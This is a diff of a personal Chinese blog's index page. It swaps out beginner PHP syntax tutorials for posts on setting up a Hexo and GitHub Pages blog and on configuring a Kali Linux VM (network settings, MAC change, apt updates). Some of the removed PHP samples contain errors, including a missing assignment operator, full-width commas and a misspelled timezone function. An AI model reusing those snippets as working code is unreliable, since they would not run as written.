@@ -553,31 +1119,48 @@
 
 
   
-    <article id="post-PHP语法（九）—访问控制" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-hexo-+-github搭建博客" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/20/PHP语法（九）—访问控制/">PHP语法（九） — 访问控制</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/">hexo + github搭建博客</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/20/PHP语法（九）—访问控制/" class="archive-article-date">
-  	<time datetime="2019-02-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-20</time>
+        <a href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/" class="archive-article-date">
+  	<time datetime="2019-01-27T12:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>对属性或方法的访问控制，是通过在前面添加关键字public、protected或private来实现的。由public所定义的类成员可以在任何地方被访问；由protected所定义的类成员则可以被其所在类的子类和父类访问（当然，该成员所在的类也可以访问）；而由priva<br>te定义的类成员则只能被其所在类访问</p>
+        <h2 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip 1"></a>Tip 1</h2><p>前面大致的步骤参考这篇文章：<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p>
+<h2 id="Tip-2"><a href="#Tip-2" class="headerlink" title="Tip 2"></a>Tip 2</h2><p>可能Github有更新，仓库的地址格式有些变动，我们还是直接点击仓库，然后根据浏览器弹出的新的页面的URL，复制粘贴进去比较好</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/1.png" alt="1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/2.png" alt="2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/3.png" alt="3"></p>
+<h2 id="Tip-3"><a href="#Tip-3" class="headerlink" title="Tip 3"></a>Tip 3</h2><p>去这个网站下载主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+<p>挑选好喜欢的博客后，点击链接到他们Github的页面，下载下来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/4.png" alt="4"></p>
+<p>直接解压到 <strong>themes</strong> 这个文件夹下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/5.png" alt="5"></p>
+<p>然后在 <strong>_config.yml</strong> 这个配置文件中 <strong>Extensions</strong> 模块的 <strong>theme</strong> 改成刚才那个文件的名字，模板就运用成功了，然后就可以根据自己的喜好修改一些东西</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/6.png" alt="6"></p>
+<h2 id="Tip-4"><a href="#Tip-4" class="headerlink" title="Tip 4"></a>Tip 4</h2><p>主题设置完之后，本地测试通过（hexo clean + hexo s + 访问127.0.0.1:4000），经过个人喜好修改的博客可以正常显示，但是上传到Github上就不行（hexo clean + hexo g &amp;&amp; hexo d）。后来发现是 <strong>_config.yml</strong> 中有些参数没设置好：</p>
+<p>在仓库界面中点击 <strong>Setting</strong> 找到 <strong>Repository name</strong> 写到 <strong>_config.yml</strong> 文件中的 <strong>url</strong>   </p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/7.png" alt="7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/8.png" alt="8"></p>
+<p>找到 <strong>GitHub Pages</strong> 中我们获取到的博客地址，同样写到 <strong>_config.yml</strong> 文件中的 <strong>root</strong> </p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/9.png" alt="9"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/10.png" alt="10"></p>
+<h3 id="现在再次访问博客，就可以正常显示了"><a href="#现在再次访问博客，就可以正常显示了" class="headerlink" title="现在再次访问博客，就可以正常显示了"></a>现在再次访问博客，就可以正常显示了</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/11.png" alt="11"></p>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、访问控制"><a href="#一、访问控制" class="headerlink" title="一、访问控制"></a>一、访问控制</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Student&#123;</span><br><span class="line">    //声明私有属性</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line">    private $sex;</span><br><span class="line">    </span><br><span class="line">    //构建函数</span><br><span class="line">    function __construct($name,$age,$sex)&#123;</span><br><span class="line">        $this -&gt; name = $name;</span><br><span class="line">        $this -&gt; age = $age;</span><br><span class="line">        $this -&gt; sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //对象无法直接访问私有属性，但通过魔术方法可以改变这点 __get() __set()</span><br><span class="line">    function __get($proName)&#123;</span><br><span class="line">        return $this -&gt; $proName;</span><br><span class="line">    &#125;</span><br><span class="line">    function __set($proName,$proValue)&#123;</span><br><span class="line">        $this -&gt; $proName $proValue;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //通过函数访问私有属性</span><br><span class="line">    function say()&#123;</span><br><span class="line">        return &quot;我叫：$this -&gt; name 年龄：$this -&gt; age 性别：$this -&gt; sex&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //析构函数用来释放内存</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;&lt;/br&gt;运行结束，释放内存&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A = new Student(&quot;素白&quot;，22，&quot;男&quot;);	//创建对象</span><br><span class="line">echo $A -&gt; name.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo $A -&gt; say();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-1.png" alt="1-1"></p>
-<h4 id="1-2-查看返回结果"><a href="#1-2-查看返回结果" class="headerlink" title="1.2 查看返回结果"></a>1.2 查看返回结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-2.png" alt="1-2"></p>
+<h2 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git config --global user.email &quot;240375426@qq.com&quot;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -591,7 +1174,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">博客搭建</a>
         		</li>
       		
 		</ul>
@@ -601,7 +1184,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/20/PHP语法（九）—访问控制/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/">展开全文 >></a>
         </p>
       
 
@@ -631,32 +1214,74 @@
 
 
   
-    <article id="post-PHP语法（八）—构造函数及析构函数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Kali系统—工具安装和系统调整" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/19/PHP语法（八）—构造函数及析构函数/">PHP语法（八） — 构造函数及析构函数</a>
+      <a class="article-title" href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/">Kali系统 — 工具安装和系统调整</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/19/PHP语法（八）—构造函数及析构函数/" class="archive-article-date">
-  	<time datetime="2019-02-18T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-19</time>
+        <a href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/" class="archive-article-date">
+  	<time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）<strong>__construct()</strong>构造函数，用来初始化对象</p>
-<p>（2）<strong>__destruct()</strong>析构函数，释放所暂用的内存</p>
+        <h2 id="VMware-tools的安装"><a href="#VMware-tools的安装" class="headerlink" title="VMware tools的安装"></a>VMware tools的安装</h2><ul>
+<li><p>点击“虚拟机”-&gt;安装VMware tools</p>
+</li>
+<li><p>此时在在文件管理栏会出现一个VMware tools distrib的位置，访问发现一个文件</p>
+</li>
+<li><p>但是此时我们是没有权限tar这个压缩包的，做法是先将它拷贝到我们的用户主目录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp VMwareTools-10.2.5.8068393.tar.gz ~/</span><br></pre></td></tr></table></figure>
+<p>-然后再将之解压下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxf VMwareTools-10.2.5.8068393.tar.gz</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解压下来我们可以看到vmware-tools-distrib这个文件夹，进去之后执行这个vmware-install.pl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>做到这里的时候，我们的VMware tools已经安装好，此时就可以实现将Window的文字或文件复制到Linux下了</p>
+</li>
+</ul>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、构造函数及析构函数"><a href="#一、构造函数及析构函数" class="headerlink" title="一、构造函数及析构函数"></a>一、构造函数及析构函数</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Car&#123;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        print &quot;构造函数被调用 &lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        print &quot;析构函数被调用 &lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$car = new Car();	//实例化时会调用构造函数</span><br><span class="line"></span><br><span class="line">echo &quot;使用后，准备销毁car对象.&lt;/br&gt;&quot;;</span><br><span class="line">unset($car);	//摧毁时会调用析构函数</span><br><span class="line"></span><br><span class="line">echo &quot;----------分割线----------&lt;/br&gt;&quot;;</span><br><span class="line">$car = new Car();	//实例化的时候会自动调用构造函数__construct，这里会输出一个字符串</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%8F%8A%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0/1-1.png" alt="1-1"></p>
-<h4 id="1-2-查看返回结果"><a href="#1-2-查看返回结果" class="headerlink" title="1.2 查看返回结果"></a>1.2 查看返回结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%8F%8A%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0/1-2.png" alt="1-2"></p>
+<h2 id="网络配置（临时）"><a href="#网络配置（临时）" class="headerlink" title="网络配置（临时）"></a>网络配置（临时）</h2><p><strong>注意</strong>：以下步骤制定的地址是临时的，重启之后恢复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dhclient eth0</span><br><span class="line">ifconfig eth0 192.168.1.11/24</span><br><span class="line">route add default gw 192.168.1.1</span><br><span class="line">echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure>
+<p>更改网卡的地址（记得IP地址加掩码）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.1.10/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-1.png" alt="1-1"></p>
+<p>更改网关地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add default gw 192.168.1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-2.png" alt="1-2"></p>
+<p>更改网络后查看网络情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nr</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-3.png" alt="1-3"></p>
+<p>更改网络地址后，添加路由信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 172.168.1.0/24 gw 192.168.1.100</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-4.png" alt="1-4"></p>
+<p><strong>修改网卡的MAC地址</strong></p>
+<p>先关掉网卡，然后执行下面命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig eth0 hw ether (MAC地址)</span><br></pre></td></tr></table></figure>
+<p>再次启动网卡，就可以了，但是下次启动就失效了</p>
+<hr>
+<h2 id="网络配置（永久）"><a href="#网络配置（永久）" class="headerlink" title="网络配置（永久）"></a>网络配置（永久）</h2><p><strong>注意</strong>：以下步骤制定的地址是永久的，需要再次修改配置文件才能恢复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/network/interface</span><br><span class="line">	auto eth0</span><br><span class="line">	iface eth0 inet static</span><br><span class="line">	address 192.168.20.1</span><br><span class="line">	netmask 255.255.255.0</span><br><span class="line">	network 192.168.20.0</span><br><span class="line">	broadcast 192.168.20.255</span><br><span class="line">	gateway 192.168.20.2</span><br><span class="line">	dns-nameservers 192.168.1.1 192.168.1.2</span><br><span class="line">	up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1</span><br><span class="line">	down route del -net 172.24.0.0/24</span><br></pre></td></tr></table></figure>
+<p>通过修改<strong>/etc/network/interfaces</strong>文件的配置来永久修改网络配置</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/2-1.png" alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/2-1-2.png" alt="2-2"></p>
+<p>清空ARP表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip neigh flush dev eth0</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="系统的更新"><a href="#系统的更新" class="headerlink" title="系统的更新"></a>系统的更新</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">	科技大学更新源</span><br><span class="line">	deb http://mirrors.ustc.edu.cn/kali kali main non-free conrtib</span><br><span class="line">	deb-src http://mirrors.ustc.edu.cn/kalikali main non-free contrib</span><br><span class="line">	deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get dis-upgrade</span><br><span class="line">重复执行</span><br></pre></td></tr></table></figure>
+<p>先执行<strong>apt-get update</strong>，再执行<strong>apt-getupgrade</strong></p>
+<p>apt-get update是更新索引文件，apt-get upgrade是更新安装包</p>
+<p>如果在使用apt-get update的过程中出现了问题，加参数–fix-missing</p>
 
       
 
@@ -670,7 +1295,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Kali系统</a>
         		</li>
       		
 		</ul>
@@ -680,244 +1305,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/19/PHP语法（八）—构造函数及析构函数/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHP语法（七）—类的属性及定义方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/18/PHP语法（七）—类的属性及定义方法/">PHP语法（七） — 类的属性及定义方法</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/18/PHP语法（七）—类的属性及定义方法/" class="archive-article-date">
-  	<time datetime="2019-02-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）类的变量成员叫做“属性”。属性声明是由关键字public / protected / private开头，然后跟一个变量来组成<br>（2）在类的成员方法里面，可以通过$this-&gt;property(property是属性名字）这种方式来访问类的属性、方法，但是要访问类的静态属性或者在静态方法里面却不能使用，而是使用self::Sproperty(初级了解)<br>（2）定界符：<br>PHP定界符的作用就是按照原样，包括换行格式什么的，输出在其内部的东西；在PHP定界符中的任何特殊字符都不需要转义；PHP定界符中的PHP变量会被正常的用其值来替换</p>
-<hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、类的属性及定义方法（public为例）"><a href="#一、类的属性及定义方法（public为例）" class="headerlink" title="一、类的属性及定义方法（public为例）"></a>一、类的属性及定义方法（public为例）</h3><h4 id="1-1-输入代码"><a href="#1-1-输入代码" class="headerlink" title="1.1 输入代码"></a>1.1 输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建一个Student类</span><br><span class="line">class Student&#123;</span><br><span class="line">    //属性声明为共有的</span><br><span class="line">    public $a = &quot;sdfa&quot;;</span><br><span class="line">    public $b = array(&quot;a&quot;,&quot;b&quot;,3);</span><br><span class="line">    </span><br><span class="line">    //PHP定界符，这里AAA为定界标识符，里面的内容全部输出</span><br><span class="line">    public $c =&lt;&lt;&lt;AAA</span><br><span class="line">    hello world</span><br><span class="line">    </span><br><span class="line">    AAA;</span><br><span class="line">    //结束标识符，行首写且单占一行除了后面跟;结尾</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$A = new Student();</span><br><span class="line">print_r($A -&gt; b);</span><br><span class="line">echo &quot;&lt;/br&quot;&gt;;</span><br><span class="line">echo $A -&gt; a.&quot;&lt;/br&gt;&quot;.$A -&gt; c;</span><br><span class="line"></span><br><span class="line">//这里只做public访问。private/protected会在后面  访问控制  中说明</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%8F%8A%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/1-1.png" alt="1-1"></p>
-<h4 id="二、查看返回结果"><a href="#二、查看返回结果" class="headerlink" title="二、查看返回结果"></a>二、查看返回结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%8F%8A%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/1-2.png" alt="1-2"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/18/PHP语法（七）—类的属性及定义方法/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PHP语法（六）—日期" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/17/PHP语法（六）—日期/">PHP语法（六） — 日期</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/17/PHP语法（六）—日期/" class="archive-article-date">
-  	<time datetime="2019-02-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）date()函数用于对日期或时间进行格式化</p>
-<p>（2）date_default_timezone_set(“PRC”)设置时间区</p>
-<hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、日期"><a href="#一、日期" class="headerlink" title="一、日期"></a>一、日期</h3><p>由于PHP获取的时间默认认为格林威治标准时间，可自己设置默认时间区</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timeout_set(&apos;PRC&apos;);	//设置中国时区</span><br><span class="line">echo &quot;今天是&quot;.date(&quot;Y-m-d&quot;).&quot;现在时间是&quot;.date(&quot;h:i:sa&quot;).&quot;&lt;/br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//strtotime()用来创建日期，不过不完美</span><br><span class="line"></span><br><span class="line">$d1 = strtotime(&quot;December 31&quot;);</span><br><span class="line">$d2 = ceil(($d1-time())/60/60/24);</span><br><span class="line">echo &quot;距离十二月三十一日还有：&quot;.$d2.&quot;天。&quot;;</span><br><span class="line"></span><br><span class="line">//输出周六的日期</span><br><span class="line">$startdate = strtotime(&quot;Saturday&quot;);</span><br><span class="line">$enddate = strtotime(&quot;+6 weeks&quot;,$startdate);</span><br><span class="line"></span><br><span class="line">while($startdate &lt; $enddate)&#123;</span><br><span class="line">    echo date(&quot;M d&quot;,$startdate).&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    $startdate = strtotime(&quot;+1 week&quot;,$startdate);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E6%97%A5%E6%9C%9F/1-1.png" alt="1-1"></p>
